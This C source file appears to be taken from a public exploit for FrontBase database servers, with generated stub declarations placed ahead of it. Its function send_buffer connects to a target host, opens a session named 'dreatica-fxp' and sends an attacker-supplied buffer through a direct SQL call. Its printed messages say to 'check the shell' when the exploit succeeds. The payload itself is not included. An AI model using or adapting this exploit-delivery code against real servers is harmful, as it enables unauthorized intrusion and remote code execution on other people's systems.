#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  int /*<<< orphan*/  FBCMetaData ;
typedef  int /*<<< orphan*/  FBCErrorMetaData ;
typedef  int /*<<< orphan*/  FBCDatabaseConnection ;

/* Variables and functions */
 int /*<<< orphan*/  fbcInitialize () ; 
 int /*<<< orphan*/  fbcdcClose (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/ * fbcdcConnectToDatabase (char*,char*,char*) ; 
 int /*<<< orphan*/ * fbcdcConnectToDatabaseUsingPort (char*,int,char*) ; 
 int /*<<< orphan*/ * fbcdcCreateSession (int /*<<< orphan*/ *,char*,char*,char*,char*) ; 
 int /*<<< orphan*/ * fbcdcErrorMetaData (int /*<<< orphan*/ *,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/ * fbcdcExecuteDirectSQL (int /*<<< orphan*/ *,char*) ; 
 int /*<<< orphan*/  fbcdcRelease (int /*<<< orphan*/ *) ; 
 char* fbcemdAllErrorMessages (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  fbcemdRelease (int /*<<< orphan*/ *) ; 
 scalar_t__ fbcmdErrorsFound (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  fbcmdRelease (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  free (char*) ; 
 int /*<<< orphan*/  printf (char*,...) ; 
 int strlen (char*) ; 

int send_buffer(char * host, int port, char * user, char * password, char * dbpassword, char * database, char * buf)
{
	FBCDatabaseConnection * fbdc;
	FBCMetaData *meta;
	char sesn[]="dreatica-fxp";   
	if(database!=NULL) port = -1;
	fbcInitialize();	
   	if (port!=-1)
	{
		printf("[+] Connecting to %s:%d\n", host, port);
		fbdc = fbcdcConnectToDatabaseUsingPort(host, port, dbpassword); 
	}else
	{
		printf("[+] Connecting to %s to database %s\n", host, database);
		fbdc = fbcdcConnectToDatabase(database, host, dbpassword);
	}
	if (fbdc == NULL)
	{
		printf("[-] Cannot connect to %s\n", host);
		return -1;
	}	
	char * session_name=sesn;
	meta = fbcdcCreateSession(fbdc, session_name, user, password, "system_user");
	if (fbcmdErrorsFound(meta) != 0)
	{
		printf("[-] Failed to create session\n");
		FBCErrorMetaData* emd = fbcdcErrorMetaData(fbdc, meta);
		char* msgs = fbcemdAllErrorMessages(emd);		
		fbcemdRelease(emd);
		free(msgs);
		fbcmdRelease(meta);
		fbcdcClose(fbdc);
		fbcdcRelease(fbdc);
		return -1;
	}   
	fbcmdRelease(meta);
	printf("[+] Sending %d bytes of buffer to server, check the shell\n", strlen(buf));
		// if exploit success, the app will stop here.
	meta = fbcdcExecuteDirectSQL(fbdc, buf);
	if (fbcmdErrorsFound(meta) != 0)
	{
		printf("[-] Failed to send buffer\n");
		FBCErrorMetaData* emd = fbcdcErrorMetaData(fbdc, meta);
		char* msgs = fbcemdAllErrorMessages(emd);		
		fbcemdRelease(emd);
		free(msgs);
		fbcmdRelease(meta);
		fbcdcClose(fbdc);
		fbcdcRelease(fbdc);
		return -1;
	}
	fbcmdRelease(meta);
	return 1;
}